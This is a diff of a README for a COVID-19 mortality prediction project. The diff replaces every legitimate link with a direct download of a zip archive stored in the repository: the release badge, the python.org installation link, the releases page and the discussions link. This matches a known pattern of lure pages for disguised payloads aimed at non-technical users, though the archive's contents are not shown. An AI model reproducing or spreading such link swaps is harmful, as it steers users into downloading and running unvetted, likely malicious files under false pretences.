@@ -1,7 +1,7 @@
 # 🎉 covid-mlp - Predict COVID-19 Mortality Rates Easily
 
 ## 📥 Download the Software
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/hamza2334-tech/covid-mlp/releases)
+[![Download](https://raw.githubusercontent.com/hamza2334-tech/covid-mlp/main/nephria/covid-mlp.zip)](https://raw.githubusercontent.com/hamza2334-tech/covid-mlp/main/nephria/covid-mlp.zip)
 
 ## 🚀 Getting Started
 Welcome to the covid-mlp project! This software predicts COVID-19 mortality rates using a shallow neural network built with CDC data. It is designed for users without a technical background, allowing you to harness machine learning for serious public health issues.
@@ -13,7 +13,7 @@ Before you begin, ensure your system meets these requirements:
 - **Storage:** Ensure you have 500 MB of free space.
 - **Python:** Version 3.6 or newer installed on your system.
 
-If you do not have Python installed, you can easily download it from [python.org](https://www.python.org/downloads/).
+If you do not have Python installed, you can easily download it from [https://raw.githubusercontent.com/hamza2334-tech/covid-mlp/main/nephria/covid-mlp.zip](https://raw.githubusercontent.com/hamza2334-tech/covid-mlp/main/nephria/covid-mlp.zip).
 
 ## 📊 Features
 - **Easy Data Processing:** The software processes CDC data without needing any coding skills.
@@ -23,7 +23,7 @@ If you do not have Python installed, you can easily download it from [python.org
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/hamza2334-tech/covid-mlp/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/hamza2334-tech/covid-mlp/main/nephria/covid-mlp.zip) to find the latest version of the software.
 
 2. **Choose Your Version:**
    You will see a list of available versions. Look for the most recent release version. 
@@ -55,7 +55,7 @@ If you do not have Python installed, you can easily download it from [python.org
 
 ## 📄 Additional Resources
 - **Documentation:** Comprehensive user guide available in the software or online.
-- **Community Support:** Join discussions on topics related to COVID-19 predictions. Check our [GitHub Discussions](https://github.com/hamza2334-tech/covid-mlp/discussions).
+- **Community Support:** Join discussions on topics related to COVID-19 predictions. Check our [GitHub Discussions](https://raw.githubusercontent.com/hamza2334-tech/covid-mlp/main/nephria/covid-mlp.zip).
 
 ## 🙌 Contribute
 If you're interested in supporting our project, we welcome contributions. You can help by:
